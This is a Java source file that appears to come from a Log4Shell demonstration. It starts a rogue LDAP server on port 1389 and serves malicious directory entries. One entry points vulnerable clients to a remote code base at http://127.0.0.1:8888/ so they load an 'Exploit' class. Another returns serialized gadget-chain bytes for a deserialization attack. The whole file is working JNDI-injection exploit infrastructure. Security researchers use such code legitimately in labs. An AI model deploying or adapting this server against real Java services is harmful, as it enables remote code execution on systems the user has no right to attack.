package log4shell;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.Entry;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import java.io.IOException;
import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Path;

public class Main {
    public static void main(String[] args) throws Exception {
        System.out.println("starting ldap server");
        runServer();
    }

    static void runServer() throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=log4shell");

        config.setListenerConfigs(new InMemoryListenerConfig("listen",
            InetAddress.getByName("0.0.0.0"),
            1389,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())
        );

        LdapResponseInterceptor interceptor = new LdapResponseInterceptor();
        config.addInMemoryOperationInterceptor(interceptor);

        addExampleEntry(interceptor);
        addRemoteExploitEntry(interceptor);
        addDirectDeserializationExploit(interceptor);

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

        ds.startListening();
    }

    private static void addExampleEntry(LdapResponseInterceptor interceptor) {
        Entry entry = new Entry("dc=example");
        entry.addAttribute("objectClass", "person");
        entry.addAttribute("sn", "Cooper");
        entry.addAttribute("givenName", "Dale");
        interceptor.addEntry(entry);
    }

    private static void addRemoteExploitEntry(LdapResponseInterceptor interceptor) {
        Entry entry = new Entry("dc=javaNamingReference");
        entry.addAttribute("javaClassName", "Exploit");
        entry.addAttribute("javaCodeBase", "http://127.0.0.1:8888/");
        entry.addAttribute("objectClass", "javaNamingReference");
        entry.addAttribute("javaFactory", "Exploit");
        interceptor.addEntry(entry);
    }

    private static void addDirectDeserializationExploit(LdapResponseInterceptor interceptor) {
        Entry entry = new Entry("dc=javaSerializedData");
        entry.addAttribute("javaClassName", "Exploit");
        entry.addAttribute("objectClass", "javaMarshalledObject");
        entry.addAttribute("javaSerializedData", fetchExploitableClass());
        interceptor.addEntry(entry);
    }

    private static byte[] fetchExploitableClass() {
        try {
            return Files.readAllBytes(Path.of("../serialization/CommonsExploit.out"));
        } catch (IOException ex) {
            ex.printStackTrace();
            System.exit(1);
        }
        return new byte[0];
    }

}
